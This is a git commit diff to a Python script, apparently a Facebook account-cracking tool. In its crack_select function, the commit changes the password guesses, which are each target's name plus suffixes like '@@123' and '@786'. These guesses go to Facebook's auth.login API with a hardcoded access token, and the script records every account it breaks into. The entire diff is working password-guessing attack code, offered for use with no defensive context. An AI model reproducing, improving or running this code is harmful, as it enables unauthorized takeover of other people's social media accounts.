8ddedd2833a39cc90e7927e721d9ffe04422cb4a
Rishu Khan <89701654+alone-rishu@users.noreply.github.com>
2021-08-29 13:12:04 +0530

    Update fari.py

--- fari.py
+++ fari.py
@@ -106,7 +106,7 @@ def crack_select():
         session = requests.Session()
         session.headers.update({'User-Agent': ranagent})
         try:
-            pass1 = name_lower + '123'
+            pass1 = name_lower + '@@123'
             data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
             q = json.loads(data)
             if 'access_token' in q:
@@ -122,7 +122,7 @@ def crack_select():
                 cp.close()
                 cps.append(uid + pass1)
             else:
-                pass2 = name_lower + '1234'
+                pass2 = name_lower + '@@'
                 data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                 q = json.loads(data)
                 if 'access_token' in q:
@@ -138,7 +138,7 @@ def crack_select():
                     cp.close()
                     cps.append(uid + pass2)
                 else:
-                    pass3 = name_lower + '12345'
+                    pass3 = name_lower + '@@@'
                     data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                     q = json.loads(data)
                     if 'access_token' in q:
@@ -154,7 +154,7 @@ def crack_select():
                         cp.close()
                         cps.append(uid + pass3)
                     else:
-                        pass4 = name_lower + '786'
+                        pass4 = name_lower + '@786'
                         data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                         q = json.loads(data)
                         if 'access_token' in q:
@@ -170,7 +170,7 @@ def crack_select():
                             cp.close()
                             cps.append(uid + pass4)
                         else:
-                            pass5 = name_lower() + '1122'
+                            pass5 = name_lower() + '@12345'
                             data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                             q = json.loads(data)
                             if 'access_token' in q:
